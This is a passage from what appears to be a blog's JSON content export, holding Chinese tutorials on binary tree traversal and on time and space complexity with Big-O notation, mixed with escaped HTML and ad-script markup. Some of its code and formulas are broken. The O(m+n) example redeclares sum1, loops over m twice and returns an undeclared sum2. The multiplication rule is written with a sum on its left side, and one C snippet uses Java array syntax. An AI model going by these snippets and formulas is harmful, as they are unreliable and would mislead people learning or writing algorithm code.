title=\"二叉树的遍历\"></a>二叉树的遍历</h3></div><br></div>\n\n<p>前面我讲了二叉树的基本定义和存储方法，现在我们来看二叉树中非常重要的操作，二叉树的遍历。这也是非常常见的面试题。</p>\n<p>如何将所有节点都遍历打印出来呢？经典的方法有三种，<strong>前序遍历、中序遍历、后序遍历</strong>。其中，前、中、后序，表示的是节点与它的左右子树节点遍历打印的先后顺序。</p>\n<ul>\n<li><p>前序遍历是指，对于树中的任意节点来说，先打印这个节点，然后再打印它的左子树，最后打印它的右子树。</p>\n</li>\n<li><p>中序遍历是指，对于树中的任意节点来说，先打印它的左子树节点，在打印它本身，最后打印它的右子树节点。</p>\n</li>\n<li><p>后序遍历是指，对于树中的任意节点来说，先打印它的左子树节点，在打印它的右子树节点，最后打印这个节点本身。</p>\n</li>\n</ul>\n<p>实际上，二叉树的前、中、后序遍历就是一个递归的过程。比如，前序遍历，其实就是先打印根节点，然后再递归地打印左子树，最后递归的打印右子树。</p>\n<p>写递归代码的关键，就是看能不能写出递推公式，而写递推公式的关键，就是要看解决问题A，就假设子问题B、C已经解决，然后再来看如何利用B、C来解决A。所以，我们可以把前、中、后序遍历的递推公式都写出来。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">前序遍历的递推公式</span><br><span class=\"line\">preOrder(r) = print r -&gt; preOrder(r-&gt;left) -&gt; preOrder(r-&gt;right)</span><br><span class=\"line\"></span><br><span class=\"line\">中序遍历的递推公式</span><br><span class=\"line\">inOrder(r) = inOrder(r-&gt;left) -&gt; print r -&gt; inOrder(r-&gt;right)</span><br><span class=\"line\"></span><br><span class=\"line\">后序遍历的递推公式</span><br><span class=\"line\">postOrder(r) = postOrder(r-&gt;left) -&gt; postOrder(r-&gt;right) -&gt; print r</span><br></pre></td></tr></table></figure>\n<p>有了递推公式，代码写起来就简单多了，这三种遍历方式的代码，我都写出来了，你可以看看。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void preOrder(Node* root) &#123;</span><br><span class=\"line\">    if (root == null) return;</span><br><span class=\"line\"></span><br><span class=\"line\">    print root; // 伪代码，表示打印root节点</span><br><span class=\"line\">    preOrder(root-&gt;left)</span><br><span class=\"line\">    preOrder(root-&gt;right)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void inOrder(Node* root) &#123;</span><br><span class=\"line\">    if(root == null) return;</span><br><span class=\"line\">    inOrder(root-&gt;left);</span><br><span class=\"line\">    print  root;</span><br><span class=\"line\">    inOrder(root-&gt;right)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void postOrder(Node* root) &#123;</span><br><span class=\"line\">    if(root == null) return;</span><br><span class=\"line\">    postOrder(root-&gt;left);</span><br><span class=\"line\">    postOrder(root-&gt;right)</span><br><span class=\"line\">    print root;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>二叉树的前、中、后序遍历是不是很简单？你知道二叉树遍历的时间复杂度是多少吗？我们一起来看看。</p>\n<p>从我前面画的前、中、后序遍历的顺序图，可以看出来，每个节点最多被访问两次，所以遍历的时间复杂度，跟节点的个数n成正比，也就是说二叉树的遍历的时间复杂度是O(n).</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇-内容小姐\"><a href=\"#解答开篇-内容小姐\" class=\"headerlink\" title=\"解答开篇|内容小姐\"></a>解答开篇|内容小姐</h3></div><br></div>\n\n<p>今天，讲了一种非线性表数据结构，树。关于树，有几个比较常用的概念你需要掌握，那就是跟节点、叶子节点、父节点、子节点、兄弟节点，还有节点的高度、深度、层数，以及树的高度。</p>\n<p>我们平时最常用的就是二叉树。二叉树的每个节点最多有两个子节点，分别是左子节点和右子节点。二叉树中，有两个比较特殊的树，满二叉树和完全二叉树。满二叉树是完全二叉树的一中特殊情况。</p>\n<p>二叉树既可以用链式存储，也可以用数组顺序存储。数组顺序存储的方式比较适合完全二叉树，其他类型的二叉树用数组存储会比较浪费存储空间。除此之外，二叉树里非常重要的操作就是前、中、后序遍历操作，遍历的操作时间复杂度是O(n)，你需要理解并能用递归代码来实现，</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><ol>\n<li><p>给定一组数据，比如1、3、5、6、9、10.你来算算，可以构建出多少种不同的二叉树？</p>\n</li>\n<li><p>我们讲了三种二叉树的遍历方式，前、中、后序。实际上，还有另外一种遍历方式，就是按层遍历，你知道如何实现吗？</p>\n</li>\n</ol>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>"},{"title":"算法-复杂度分析","date":"2018-09-07T16:18:36.000Z","mathjax":true,"_content":"\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n我们都知道，数据结构和算法本身解决的是“快”和“省”的问题，即如何让代码运行的更快、更省存储空间。那如何来衡量算法的“快”和“省”呢？这就要用到复杂度分析：时间、空间复杂度分析。复杂度分析是整个算法学习的精髓，掌握了它，数据结构和算法的内容基本就掌握了一半。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 为什么需要复杂度分析\n{% endnote %}\n</div>\n\n有人说，我只要把代码跑一遍，通过统计、监控，就可以得到算法执行的时间和占用的那内存，为什么还要做复杂度分析呢？\n\n- 1、首先，这种评估方法确实是准确的，但是这种方法是\"事后统计法\"，**是有非常大的局限性**。\n\n- 2、**测试结果非常依赖测试环境**，同样一段代码，在不同的CPU可能执行的时间会差很多，比如Intel Core i9就比i3运行的快，同样在不同的两台机器上也可能会出现代码执行不一样的情况。\n\n- 3、对于**不同的数据集，如果数据的有序程度不一样**，那么对数据进行同一种算法运算，也可能会得到不同的结果。除此之外，**数据规模的大小**也可能对算法产生影响。\n\n\n因此我们需要一个不用具体的测试数据来测试，就可以粗略估计算法的执行效率的方法，这就是时间、空间复杂度分析所解决的问题。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 大O复杂度表示法\n{% endnote %}\n</div>\n\n算法的执行效率，粗略的讲，就是算法执行的时间，但是如何能在不运行的情况下，得到一段代码的运行时间呢？\n\n这里举一个简单的例子，求解1，2，3......n 的累加和，以下为一个简单的代码实现：\n\n```C\nint sum(int n){\n  int sum = 0;\n  for (int i=1; i<=n; i++){\n    sum += i;\n  }\n  return sum;\n}\n```\n\n从CPU的角度看，每一行代码都执行着类似的操作：**读数据-运算-写数据**。尽管每行代码对应的CPU执行个数、执行时间都不尽相同，但是我们只是粗略的估计，因此这里假设每行代码执行的时间都相同，那么在此基础上，这段代码执行的时间可以进行如下计算：\n\n第二行代码执行时间为time，第三、四行代码执行的时间为 $ 2 \\times n \\times time $，所以此段代码执行的时间为$ (2n + 1)\\times time $ ，可以看出这段代码执行时间T(n)与每行代码的执行次数成正比。\n\n按照这个思路，再对以下代码段进行分析：\n\n```C\nint sum(int n){\n  int sum = 0;\n  for(int i=1; i <= n; i++){\n    for(int j=1; j <= n; j++){\n      sum += i*j;\n    }\n  }\n}\n```\n\n假设每行代码执行的时间依然为time，那么这段代码执行的时间是多少呢？\n\n第二行代码的执行时间依然为time，第三行代码执行的次数为n次，所以需要的时间为$ n\\*time $,内层循环第四、五行代码都执行了$ n\\*n $次,需要的时间为$ 2\\*n^2\\*time $。所以此段代码总的执行时间为$(n + 1 + 2n^2)\\*time $。\n\n尽管不知道time的具体值，但是通过这两段代码的分析过程，得出一个非常重要的规律：\n<div style=\"text-align: center; color: red;\">\n{% cq %} \n所有的代码执行时间T(n)与每行代码的执行次数成正比  \n$$ T(n) = O(f(n)) $$\n{% endcq %}\n</div>\n\n其中 $T(n)$ 表示代码执行的时间; n表示数据规模大小; $ f(n) $ 表示每行代码执行次数的总和，因为是一个公式，所以用$ f(n) $ 表示。公式中的O表示代码执行时间 $ T(n) $ 与 $ f(n) $ 成正比。\n\n所以在第一个例子中 $ T(n) = O(2n + 1) $ ，第二个例子中 $ T(n) = O(2n^2 + n + 1)$ , 这就是大O时间复杂度表示法。大O时间复杂度实际上并不具体表示代码真正执行的时间，而是表示代码执行时间随数据规模增长的变化趋势，所以也叫做渐进时间复杂度，简称时间复杂度。\n\n在时间复杂度公式中，如果n很大时，公式中的低阶、常量、系数三部分并不影响增长趋势，所以可以先忽略。所以上述两个例子的时间复杂度就可以记为： $ T(n) = O(n) $； $ T(n) = O(n^2) $;\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 时间复杂度分析\n{% endnote %}\n</div>\n\n前面介绍了大 O 时间复杂度的由来和表示方法，那如何分析一段代码的时间复杂度呢？\n\n#### 1、只关注循环次数最多的一段代码\n\n在大 O 表示法中，只是表示一种趋势，通常我们会忽略公式中的常量、低阶、系数，因此只需要记录一个最大的量级就可以了，所以我们在分析一个算法时，只关注循环次数执行次数最多的那一段代码就行了。\n\n#### 2、加法法则：总复杂度等于量级最大的那段代码的复杂度\n\n如果一段代码中出现多个循环，那么总的时间复杂度就是各个循环相加得到的，但是往往会忽略低阶、常量，因此只取量级最大的那段代码就可以了。\n\n注意：\n当一段代码循环次数是一个常量，比如循环10000、1000000次，只要是一个已知的常量数，且不随数据规模变化，那么该循环照样是一个常量级别的执行时间。\n\n#### 3、乘法法则: 嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积\n\n比如第二个例子中如果但看外层循环的时间复杂度是 $ O(n) $；内层循环的时间复杂度也是 $O(n)$， 因此总共的时间复杂度就是 $ T(n) = O(n) \\* O(n) = O(n^2) $ \n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 几种常见时间复杂度\n{% endnote %}\n</div>\n\n\n#### 1、$O(1)$\n\nO(1) 只是常量级时间复杂度的一种表示方法，并不是指执行了一行代码。只要代码的执行时间不随n的增大而增大，这样的代码时间复杂度都可以记为O(1)。一般情况下，只要代码中不出现循环、递归等，即使有成千上万行代码，时间复杂度也是O(1)。\n\n#### 2、$ O(logN)、O(N\\*logN) $\n\n对数阶的时间复杂度非常常见，同时也是最难分析的一种。\n\n```C\nint i = 1;\nwhile(i <= n){\n  i = i * 2;\n}\n```\n在上述代码中，变量i从1取值，第二次为2，第三次为4，第四次为8......,所以i的取值规律为 $$ 2^0 \\&nbsp;&nbsp;&nbsp;&nbsp;  2^1 \\&nbsp;&nbsp;  2^2 \\&nbsp;&nbsp; 2^3 ...  2^k... 2^x $$ 当$2^x = n$ 时，循环结束，而循环的次数即为x，所以时间复杂度也为$ O(x=\\log_2 N) $。\n\n如果把代码改为如下。那时间复杂度是多少呢？\n\n```C\nint i = 1;\nwhile(i <= n){\n  i = i * 3;\n}\n```\n根据上面的思路，很容易看出这段代码的时间复杂度为$ O(log_3N) $ 。\n\n实际上，不管是以2为底，还是以3为底，亦或是以10为底，我们都把对数阶的时间复杂度记为$ O(logN) $，为什么呢？\n\n我们知道对数之间是可以互相转化的，$ log_3n$ 就可以转换为$ log_32\\*log_2N $，所以$ O(log_32) = O(C \\* log_2N) $，其中$ C = log_32 $ 是一个常量，基于前面的结论： **在采用大O标记复杂度的时候，可以忽略系数，即$ O(C\\*f(n)) = O(f(n)) $**。因此在对数阶时间复杂度的表示方法里，我们忽略的底，统一表示为$O(logN)$。\n\n如果理解了$O(logN)$，那么$O(nlogN)$就很容易了，根据前面所说的乘法法则，如果一段代码的时间复杂度是$O(logN)$，如果循环执行了 n 次，那么该代码的时间复杂度就是$O(nlogN)$。而且$O(nlogN)$是一种非常常见的时间复杂度，归并排序、快速排序的时间复杂度都是$O(nlogN)$。\n\n#### 2、$ O(m+n)、O(m\\*n) $\n\n我们再来讲跟前面都不一样的时间复杂度，代码的时间复杂度由两个数据规模来决定。\n\n```C\nint func(int m, int n){\n  int sum1 = 0;\n  for(int i=1; i<=m; i++){\n    sum1 += i;\n  }\n\n  int sum1 = 0;\n  for(int j=1; j<=m; j++){\n    sum1 += j;\n  }\n  return sum1+sum2;\n}\n```\n\n从代码中看出，m和n表示两个不同的数据规模，我们无法事先评估m和n的量级大小，所以我们在分析复杂度时，就不能简单用加法法则忽略一个，因此上面代码的时间复杂度为$O(m + n)$，\n\n针对这种情况，加法原则就不正确了，我们将加法原则改为：$ T1(m) + T2(n) = O(f(m) + g(n)) $，但是乘法法则继续有效：$ T1(m) + T2(n) = O(f(m) \\* f(n)) $。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 空间复杂度\n{% endnote %}\n</div>\n\n前面讲过，时间复杂度的全称是渐近时间复杂度，表示算法的执行时间与数据规模之间的增长关系。类比一下，空间复杂度的全称就是渐进空间复杂度，表示算法的存储空间与数据规模的增长关系。\n\n还是拿具体的例子说明(仅供测试,一般没人这么写)\n\n```C\nvoid func(int n){\n  int i = 0;\n  int[] a = new int[n];\n  for(i; i<n; i++){\n    a[i] = i*1;\n    print(a[i]);\n  }\n}\n```\n\n和分析时间复杂度一样，我们看到第二行申请了一个空间变量i，但是它是常量阶的，跟数据规模n无关，所以可以忽略，第三行申请了一个大小为n的int数组，除此之外，该代码没有占据更多的空间O(n).\n\n我们常见的空间复杂度就是$O(1)、O(n)、O(n^2)$，像$ O(logN)、O(nlogN) $ 这样的对数阶复杂度平时都用不到。空间复杂度分析相对时间复杂度要简单得多。\n\n\n<br>","source":"_posts/算法-复杂度分析.md","raw":"---\ntitle: 算法-复杂度分析\ndate: 2018-09-08 00:18:36\ntags: ['算法','复杂度分析']\ncategories: 算法\nmathjax: true\n---\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n我们都知道，数据结构和算法本身解决的是“快”和“省”的问题，即如何让代码运行的更快、更省存储空间。那如何来衡量算法的“快”和“省”呢？这就要用到复杂度分析：时间、空间复杂度分析。复杂度分析是整个算法学习的精髓，掌握了它，数据结构和算法的内容基本就掌握了一半。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 为什么需要复杂度分析\n{% endnote %}\n</div>\n\n有人说，我只要把代码跑一遍，通过统计、监控，就可以得到算法执行的时间和占用的那内存，为什么还要做复杂度分析呢？\n\n- 1、首先，这种评估方法确实是准确的，但是这种方法是\"事后统计法\"，**是有非常大的局限性**。\n\n- 2、**测试结果非常依赖测试环境**，同样一段代码，在不同的CPU可能执行的时间会差很多，比如Intel Core i9就比i3运行的快，同样在不同的两台机器上也可能会出现代码执行不一样的情况。\n\n- 3、对于**不同的数据集，如果数据的有序程度不一样**，那么对数据进行同一种算法运算，也可能会得到不同的结果。除此之外，**数据规模的大小**也可能对算法产生影响。\n\n\n因此我们需要一个不用具体的测试数据来测试，就可以粗略估计算法的执行效率的方法，这就是时间、空间复杂度分析所解决的问题。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 大O复杂度表示法\n{% endnote %}\n</div>\n\n算法的执行效率，粗略的讲，就是算法执行的时间，但是如何能在不运行的情况下，得到一段代码的运行时间呢？\n\n这里举一个简单的例子，求解1，2，3......n 的累加和，以下为一个简单的代码实现：\n\n```C\nint sum(int n){\n  int sum = 0;\n  for (int i=1; i<=n; i++){\n    sum += i;\n  }\n  return sum;\n}\n```\n\n从CPU的角度看，每一行代码都执行着类似的操作：**读数据-运算-写数据**。尽管每行代码对应的CPU执行个数、执行时间都不尽相同，但是我们只是粗略的估计，因此这里假设每行代码执行的时间都相同，那么在此基础上，这段代码执行的时间可以进行如下计算：\n\n第二行代码执行时间为time，第三、四行代码执行的时间为 $ 2 \\times n \\times time $，所以此段代码执行的时间为$ (2n + 1)\\times time $ ，可以看出这段代码执行时间T(n)与每行代码的执行次数成正比。\n\n按照这个思路，再对以下代码段进行分析：\n\n```C\nint sum(int n){\n  int sum = 0;\n  for(int i=1; i <= n; i++){\n    for(int j=1; j <= n; j++){\n      sum += i*j;\n    }\n  }\n}\n```\n\n假设每行代码执行的时间依然为time，那么这段代码执行的时间是多少呢？\n\n第二行代码的执行时间依然为time，第三行代码执行的次数为n次，所以需要的时间为$ n\\*time $,内层循环第四、五行代码都执行了$ n\\*n $次,需要的时间为$ 2\\*n^2\\*time $。所以此段代码总的执行时间为$(n + 1 + 2n^2)\\*time $。\n\n尽管不知道time的具体值，但是通过这两段代码的分析过程，得出一个非常重要的规律：\n<div style=\"text-align: center; color: red;\">\n{% cq %} \n所有的代码执行时间T(n)与每行代码的执行次数成正比  \n$$ T(n) = O(f(n)) $$\n{% endcq %}\n</div>\n\n其中 $T(n)$ 表示代码执行的时间; n表示数据规模大小; $ f(n) $ 表示每行代码执行次数的总和，因为是一个公式，所以用$ f(n) $ 表示。公式中的O表示代码执行时间 $ T(n) $ 与 $ f(n) $ 成正比。\n\n所以在第一个例子中 $ T(n) = O(2n + 1) $ ，第二个例子中 $ T(n) = O(2n^2 + n + 1)$ , 这就是大O时间复杂度表示法。大O时间复杂度实际上并不具体表示代码真正执行的时间，而是表示代码执行时间随数据规模增长的变化趋势，所以也叫做渐进时间复杂度，简称时间复杂度。\n\n在时间复杂度公式中，如果n很大时，公式中的低阶、常量、系数三部分并不影响增长趋势，所以可以先忽略。所以上述两个例子的时间复杂度就可以记为： $ T(n) = O(n) $； $ T(n) = O(n^2) $;\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 时间复杂度分析\n{% endnote %}\n</div>\n\n前面介绍了大 O 时间复杂度的由来和表示方法，那如何分析一段代码的时间复杂度呢？\n\n#### 1、只关注循环次数最多的一段代码\n\n在大 O 表示法中，只是表示一种趋势，通常我们会忽略公式中的常量、低阶、系数，因此只需要记录一个最大的量级就可以了，所以我们在分析一个算法时，只关注循环次数执行次数最多的那一段代码就行了。\n\n#### 2、加法法则：总复杂度等于量级最大的那段代码的复杂度\n\n如果一段代码中出现多个循环，那么总的时间复杂度就是各个循环相加得到的，但是往往会忽略低阶、常量，因此只取量级最大的那段代码就可以了。\n\n注意：\n当一段代码循环次数是一个常量，比如循环10000、1000000次，只要是一个已知的常量数，且不随数据规模变化，那么该循环照样是一个常量级别的执行时间。\n\n#### 3、乘法法则: 嵌套代码的时间复杂度等于嵌套内外代码复杂度的乘积\n\n比如第二个例子中如果但看外层循环的时间复杂度是 $ O(n) $；内层循环的时间复杂度也是 $O(n)$， 因此总共的时间复杂度就是 $ T(n) = O(n) \\* O(n) = O(n^2) $ \n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 几种常见时间复杂度\n{% endnote %}\n</div>\n\n\n#### 1、$O(1)$\n\nO(1) 只是常量级时间复杂度的一种表示方法，并不是指执行了一行代码。只要代码的执行时间不随n的增大而增大，这样的代码时间复杂度都可以记为O(1)。一般情况下，只要代码中不出现循环、递归等，即使有成千上万行代码，时间复杂度也是O(1)。\n\n#### 2、$ O(logN)、O(N\\*logN) $\n\n对数阶的时间复杂度非常常见，同时也是最难分析的一种。\n\n```C\nint i = 1;\nwhile(i <= n){\n  i = i * 2;\n}\n```\n在上述代码中，变量i从1取值，第二次为2，第三次为4，第四次为8......,所以i的取值规律为 $$ 2^0 \\&nbsp;&nbsp;&nbsp;&nbsp;  2^1 \\&nbsp;&nbsp;  2^2 \\&nbsp;&nbsp; 2^3 ...  2^k... 2^x $$ 当$2^x = n$ 时，循环结束，而循环的次数即为x，所以时间复杂度也为$ O(x=\\log_2 N) $。\n\n如果把代码改为如下。那时间复杂度是多少呢？\n\n```C\nint i = 1;\nwhile(i <= n){\n  i = i * 3;\n}\n```\n根据上面的思路，很容易看出这段代码的时间复杂度为$ O(log_3N) $ 。\n\n实际上，不管是以2为底，还是以3为底，亦或是以10为底，我们都把对数阶的时间复杂度记为$ O(logN) $，为什么呢？\n\n我们知道对数之间是可以互相转化的，$ log_3n$ 就可以转换为$ log_32\\*log_2N $，所以$ O(log_32) = O(C \\* log_2N) $，其中$ C = log_32 $ 是一个常量，基于前面的结论： **在采用大O标记复杂度的时候，可以忽略系数，即$ O(C\\*f(n)) = O(f(n)) $**。因此在对数阶时间复杂度的表示方法里，我们忽略的底，统一表示为$O(logN)$。\n\n如果理解了$O(logN)$，那么$O(nlogN)$就很容易了，根据前面所说的乘法法则，如果一段代码的时间复杂度是$O(logN)$，如果循环执行了 n 次，那么该代码的时间复杂度就是$O(nlogN)$。而且$O(nlogN)$是一种非常常见的时间复杂度，归并排序、快速排序的时间复杂度都是$O(nlogN)$。\n\n#### 2、$ O(m+n)、O(m\\*n) $\n\n我们再来讲跟前面都不一样的时间复杂度，代码的时间复杂度由两个数据规模来决定。\n\n```C\nint func(int m, int n){\n  int sum1 = 0;\n  for(int i=1; i<=m; i++){\n    sum1 += i;\n  }\n\n  int sum1 = 0;\n  for(int j=1; j<=m; j++){\n    sum1 += j;\n  }\n  return sum1+sum2;\n}\n```\n\n从代码中看出，m和n表示两个不同的数据规模，我们无法事先评估m和n的量级大小，所以我们在分析复杂度时，就不能简单用加法法则忽略一个，因此上面代码的时间复杂度为$O(m + n)$，\n\n针对这种情况，加法原则就不正确了，我们将加法原则改为：$ T1(m) + T2(n) = O(f(m) + g(n)) $，但是乘法法则继续有效：$ T1(m) + T2(n) = O(f(m) \\* f(n)) $。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 空间复杂度\n{% endnote %}\n</div>\n\n前面讲过，时间复杂度的全称是渐近时间复杂度，表示算法的执行时间与数据规模之间的增长关系。类比一下，空间复杂度的全称就是渐进空间复杂度，表示算法的存储空间与数据规模的增长关系。\n\n还是拿具体的例子说明(仅供测试,一般没人这么写)\n\n```C\nvoid func(int n){\n  int i = 0;\n  int[] a = new int[n];\n  for(i; i<n; i++){\n    a[i] = i*1;\n    print(a[i]);\n  }\n}\n```\n\n和分析时间复杂度一样，我们看到第二行申请了一个空间变量i，但是它是常量阶的，跟数据规模n无关，所以可以忽略，第三行申请了一个大小为n的int数组，除此之外，该代码没有占据更多的空间O(n).\n\n我们常见的空间复杂度就是$O(1)、O(n)、O(n^2)$，像$ O(logN)、O(nlogN) $ 这样的对数阶复杂度平时都用不到。空间复杂度分析相对时间复杂度要简单得多。\n\n\n<br>","slug":"算法-复杂度分析","published":1,"updated":"2019-06-26T03:52:03.509Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2mn004oo25t9dntkd0m","content":"<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>我们都知道，数据结构和算法本身解决的是“快”和“省”的问题，即如何让代码运行的更快、更省存储空间。那如何来衡量算法的“快”和“省”呢？这就要用到复杂度分析：时间、空间复杂度分析。复杂度分析是整个算法学习的精髓，掌握了它，数据结构和算法的内容基本就掌握了一半。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"为什么需要复杂度分析\"><a href=\"#为什么需要复杂度分析\" class=\"headerlink\" title=\"为什么需要复杂度分析\"></a>为什么需要复杂度分析</h3></div><br></div>\n\n<p>有人说，我只要把代码跑一遍，通过统计、监控，就可以得到算法执行的时间和占用的那内存，为什么还要做复杂度分析呢？</p>\n<ul>\n<li><p>1、首先，这种评估方法确实是准确的，但是这种方法是”事后统计法”，<strong>是有非常大的局限性</strong>。</p>\n</li>\n<li><p>2、<strong>测试结果非常依赖测试环境</strong>，同样一段代码，在不同的CPU可能执行的时间会差很多，比如Intel Core i9就比i3运行的快，同样在不同的两台机器上也可能会出现代码执行不一样的情况。</p>\n</li>\n<li><p>3、对于<strong>不同的数据集，如果数据的有序程度不一样</strong>，那么对数据进行同一种算法运算，也可能会得到不同的结果。除此之外，<strong>数据规模的大小</strong>也可能对算法产生影响。</p>\n</li>\n</ul>\n<p>因此我们需要一个不用具体的测试数据来测试，就可以粗略估计算法的执行效率的方法，这就是时间、空间复杂度分析所解决的问题。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"大O复杂度表示法\"><a href=\"#大O复杂度表示法\" class=\"headerlink\" title=\"大O复杂度表示法\"></a>大O复杂度表示法</h3></div><br></div>\n\n<p>算法的执行效率，粗略的讲，就是算法执行的时间，但是如何能在不运行的情况下，得到一段代码的运行时间呢？</p>\n<p>这里举一个简单的例子，求解1，2，3……n 的累加和，以下为一个简单的代码实现：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sum</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>; i&lt;=n; i++)&#123;</span><br><span class=\"line\">    sum += i;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>从CPU的角度看，每一行代码都执行着类似的操作：<strong>读数据-运算-写数据</strong>。尽管每行代码对应的CPU执行个数、执行时间都不尽相同，但是我们只是粗略的估计，因此这里假设每行代码执行的时间都相同，那么在此基础上，这段代码执行的时间可以进行如下计算：</p>\n<p>第二行代码执行时间为time，第三、四行代码执行的时间为 $ 2 \\times n \\times time $，所以此段代码执行的时间为$ (2n + 1)\\times time $ ，可以看出这段代码执行时间T(n)与每行代码的执行次数成正比。</p>\n<p>按照这个思路，再对以下代码段进行分析：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">sum</span><span class=\"params\">(<span class=\"keyword\">int</span> n)</span></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>; i &lt;= n; i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=<span class=\"number\">1</span>; j &lt;= n; j++)&#123;</span><br><span class=\"line\">      sum += i*j;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>假设每行代码执行的时间依然为time，那么这段代码执行的时间是多少呢？</p>\n<p>第二行代码的执行时间依然为time，第三行代码执行的次数为n次，所以需要的时间为$ n*time $,内层循环第四、五行代码都执行了$ n*n $次,需要的时间为$ 2*n^2*time $。所以此段代码总的执行时间为$(n + 1 + 2n^2)*time $。</p>\n<p>尽管不知道time的具体值，但是通过这两段代码的分析过程，得出一个非常重要的规律：</p>\n<div style=\"text-align: center; color: red;\"><br><blockquote class=\"blockquote-center\"><p>所有的代码执行时间T(n)与每行代码的执行次数成正比<br>$$ T(n) = O(f(n)) $$</p>\n</blockquote><br></div>\n\n<p>其中 $T(n)$ 表示代码执行的时间; n表示数据规模大小; $ f(n) $ 